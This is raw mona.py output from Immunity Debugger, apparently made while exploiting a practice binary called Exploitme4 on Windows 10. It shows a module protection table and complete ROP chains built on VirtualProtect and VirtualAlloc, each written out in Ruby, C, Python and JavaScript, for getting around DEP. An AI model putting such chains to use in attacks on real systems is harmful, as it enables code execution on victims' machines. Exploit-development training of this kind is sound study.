================================================================================
  Output generated by mona.py v2.0, rev 634 - Immunity Debugger
  Corelan Consulting bv - https://www.corelan.be
================================================================================
  OS : 10, release 10.0.19041
  Process being debugged : Exploitme4 (pid 24612)
  Current mona arguments: rop -m "kernel32,ntdll" -cp nonnull
================================================================================
  2023-10-31 12:23:34
================================================================================
----------------------------------------------------------------------------------------------------------------------------------------------
 Module info :
----------------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Version, Modulename & Path, DLLCharacteristics
----------------------------------------------------------------------------------------------------------------------------------------------
 0x767d0000 | 0x76a0a000 | 0x0023a000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [KERNELBASE.dll] (C:\Windows\System32\KERNELBASE.dll) 0x4140
 0x770e0000 | 0x77200000 | 0x00120000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [ucrtbase.dll] (C:\Windows\System32\ucrtbase.dll) 0x4140
 0x00380000 | 0x00386000 | 0x00006000 | True   | True    | True  | False |  False   | False  | -1.0- [Exploitme4.exe] (D:\Users\czx\NativeFiles\Desktop\blog\code\Exploitme4\Release\Exploitme4.exe) 0x8140
 0x75c00000 | 0x75cf0000 | 0x000f0000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [KERNEL32.DLL] (C:\Windows\System32\KERNEL32.DLL) 0x4140
 0x6fc70000 | 0x6fc85000 | 0x00015000 | True   | True    | True  | True  |  False   | True   | 14.36.32532.0 [VCRUNTIME140.dll] (C:\Windows\SYSTEM32\VCRUNTIME140.dll) 0x4140
 0x77450000 | 0x775f4000 | 0x001a4000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll) 0x4140
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x75c4770d,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c81390,  # ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x77493c9e,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75c6d43c,  # PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x774afe38,  # POP EBP # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x7746b318,  # & push esp # ret  [ntdll.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x774ceeb8,  # POP EBX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00000201,  # 0x00000201-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x774cb229,  # POP EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00000040,  # 0x00000040-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x774d8a1f,  # POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x77573a1d,  # &Writable location [ntdll.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x774c9d25,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75c49bea,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x75c1ea52,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x75c36095,  # PUSHAD # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x75c4770d,  // POP EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c81390,  // ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x77493c9e,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75c6d43c,  // PUSH EAX // MOV DWORD PTR DS:[ESI+54],ECX // POP ESI // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ebp:---]
      0x774afe38,  // POP EBP // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x7746b318,  // & push esp // ret  [ntdll.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_ebx:---]
      0x774ceeb8,  // POP EBX // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00000201,  // 0x00000201-> ebx
      //[---INFO:gadgets_to_set_edx:---]
      0x774cb229,  // POP EDX // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00000040,  // 0x00000040-> edx
      //[---INFO:gadgets_to_set_ecx:---]
      0x774d8a1f,  // POP ECX // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x77573a1d,  // &Writable location [ntdll.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_edi:---]
      0x774c9d25,  // POP EDI // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75c49bea,  // RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_eax:---]
      0x75c1ea52,  // POP EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x75c36095,  // PUSHAD // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x75c4770d,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c81390,  # ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x77493c9e,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75c6d43c,  # PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x774afe38,  # POP EBP # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x7746b318,  # & push esp # ret  [ntdll.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x774ceeb8,  # POP EBX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00000201,  # 0x00000201-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x774cb229,  # POP EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00000040,  # 0x00000040-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x774d8a1f,  # POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x77573a1d,  # &Writable location [ntdll.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x774c9d25,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75c49bea,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x75c1ea52,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x75c36095,  # PUSHAD # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%u770d%u75c4" + // 0x75c4770d : ,# POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u1390%u75c8" + // 0x75c81390 : ,# ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
    "%u3c9e%u7749" + // 0x77493c9e : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%ud43c%u75c6" + // 0x75c6d43c : ,# PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%ufe38%u774a" + // 0x774afe38 : ,# POP EBP # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%ub318%u7746" + // 0x7746b318 : ,# & push esp # ret[ntdll.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%ueeb8%u774c" + // 0x774ceeb8 : ,# POP EBX # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%ub229%u774c" + // 0x774cb229 : ,# POP EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u8a1f%u774d" + // 0x774d8a1f : ,# POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%u3a1d%u7757" + // 0x77573a1d : ,# &Writable location [ntdll.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u9d25%u774c" + // 0x774c9d25 : ,# POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%u9bea%u75c4" + // 0x75c49bea : ,# RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%uea52%u75c1" + // 0x75c1ea52 : ,# POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%u6095%u75c3" + // 0x75c36095 : ,# PUSHAD # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x775378ca,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75c8137c,  # ptr to &VirtualAlloc() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x77493c9e,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75c6d43c,  # PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x75c22922,  # POP EBP # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x7746c712,  # & push esp # ret  [ntdll.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x7750e56f,  # POP EBX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00000001,  # 0x00000001-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x7746edd0,  # POP EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00001000,  # 0x00001000-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x77504e9f,  # POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00000040,  # 0x00000040-> ecx
      #[---INFO:gadgets_to_set_edi:---]
      0x774c9d36,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75c49bea,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x774c0293,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x75c36250,  # PUSHAD # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x775378ca,  // POP EAX // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75c8137c,  // ptr to &VirtualAlloc() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x77493c9e,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75c6d43c,  // PUSH EAX // MOV DWORD PTR DS:[ESI+54],ECX // POP ESI // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ebp:---]
      0x75c22922,  // POP EBP // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x7746c712,  // & push esp // ret  [ntdll.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_ebx:---]
      0x7750e56f,  // POP EBX // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00000001,  // 0x00000001-> ebx
      //[---INFO:gadgets_to_set_edx:---]
      0x7746edd0,  // POP EDX // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00001000,  // 0x00001000-> edx
      //[---INFO:gadgets_to_set_ecx:---]
      0x77504e9f,  // POP ECX // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00000040,  // 0x00000040-> ecx
      //[---INFO:gadgets_to_set_edi:---]
      0x774c9d36,  // POP EDI // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75c49bea,  // RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_eax:---]
      0x774c0293,  // POP EAX // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x75c36250,  // PUSHAD // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x775378ca,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75c8137c,  # ptr to &VirtualAlloc() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x77493c9e,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75c6d43c,  # PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x75c22922,  # POP EBP # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x7746c712,  # & push esp # ret  [ntdll.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x7750e56f,  # POP EBX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00000001,  # 0x00000001-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x7746edd0,  # POP EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00001000,  # 0x00001000-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x77504e9f,  # POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00000040,  # 0x00000040-> ecx
      #[---INFO:gadgets_to_set_edi:---]
      0x774c9d36,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75c49bea,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x774c0293,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x75c36250,  # PUSHAD # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%u78ca%u7753" + // 0x775378ca : ,# POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%u137c%u75c8" + // 0x75c8137c : ,# ptr to &VirtualAlloc() [IAT KERNEL32.DLL] ** REBASED ** ASLR
    "%u3c9e%u7749" + // 0x77493c9e : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%ud43c%u75c6" + // 0x75c6d43c : ,# PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u2922%u75c2" + // 0x75c22922 : ,# POP EBP # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%uc712%u7746" + // 0x7746c712 : ,# & push esp # ret[ntdll.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%ue56f%u7750" + // 0x7750e56f : ,# POP EBX # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%uedd0%u7746" + // 0x7746edd0 : ,# POP EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u4e9f%u7750" + // 0x77504e9f : ,# POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u9d36%u774c" + // 0x774c9d36 : ,# POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%u9bea%u75c4" + // 0x75c49bea : ,# RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u0293%u774c" + // 0x774c0293 : ,# POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%u6250%u75c3" + // 0x75c36250 : ,# PUSHAD # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    ""); //  : 


--------------------------------------------------------------------------------------------------

